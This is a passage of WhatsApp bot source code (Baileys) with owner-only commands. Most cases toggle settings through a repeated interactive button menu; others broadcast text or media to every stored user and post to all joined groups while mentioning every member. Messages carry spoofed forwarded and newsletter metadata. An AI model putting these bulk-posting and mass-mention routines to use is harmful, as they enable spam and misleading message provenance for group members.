          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'unavailable':
                if (!isCreator) return ownernya()
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    newReply(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    newReply(`Successfully changed unavailable to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecordtype':
                if (!isCreator) return ownernya()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    newReply(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    newReply(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecord':
                if (!isCreator) return ownernya()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    newReply(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    newReply(`Successfully changed Auto-Recording to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autotype':
                if (!isCreator) return ownernya()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    newReply(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    newReply(`Successfully changed Auto-Typing to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autobio':
                if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    newReply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    newReply(`Successfully Changed AutoBio To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autosticker': case 'autostickergc':
if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    newReply(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    newReply(`Successfully Changed Auto Sticker To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autodownload': case 'autodl':
if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autodownload = true
                    newReply(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autodownload = false
                    newReply(`Successfully Changed Auto Download To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autoblock':
                if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    newReply(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    newReply(`Successfully Changed Auto-Block To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlygroup':
            case 'onlygc':
                if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    newReply(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    newReply(`Successfully Changed Onlygroup To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    newReply(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    newReply(`Successfully Changed Only-Pc To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    newReply(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    newReply(`Successfully Changed Only-Indian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!isCreator) return ownernya()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    newReply(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    newReply(`Successfully Changed Only-Indonesian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'self': case 'public': case 'mode': {
                if (!isCreator) return ownernya()
                if (q == 'on') {
                ToxxicTechInc.public = true
                newReply('*Successful in Changing To Public Usage*')
                } else if (q == 'off') {
                ToxxicTechInc.public = false
                newReply('*Successful in Changing To Self Usage*')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT PUBLIC/SELF 🍁",
"sections":[{"title":"CHOOSE PUBLIC/SELF",
"rows":[{"header":"PUBLIC 👥",
"title":"CHOOSE ",
"description":"PUBLIC 👥",
"id":"${prefix+command} on"},
{"header":"SELF 👤",
"title":"CHOOSE ",
"description":"SELF 👤",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'setexif':
            case 'setwm':
                if (!isCreator) return ownernya()
                if (!text) return newReply(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                newReply(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
                case 'setprefix':
                if (!isCreator) return ownernya()
                if (!text) return newReply(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                newReply(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!isCreator) return ownernya()
                if (!text) return newReply(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                newReply(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!isCreator) return ownernya()
                if (!text) return newReply(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                newReply(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return ownernya()
                if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ToxxicTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                } else {
                    var memeg = await ToxxicTechInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                }
                break
            case 'leave':
            case 'out':
                if (!isCreator) return ownernya()
                if (!m.isGroup) return LorenzoStickGroup()
                newReply('Bye Everyone 🥺')
                await ToxxicTechInc.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!isCreator) return ownernya()
               if (!text) return newReply('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await ToxxicTechInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await ToxxicTechInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await ToxxicTechInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               newReply(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'jpm': case 'post': {
if (!isCreator) return ownernya()
if (!text) return newReply(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await newReply(`Waiting in progress`)
let getGroups = await ToxxicTechInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ToxxicTechInc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ToxxicTechInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
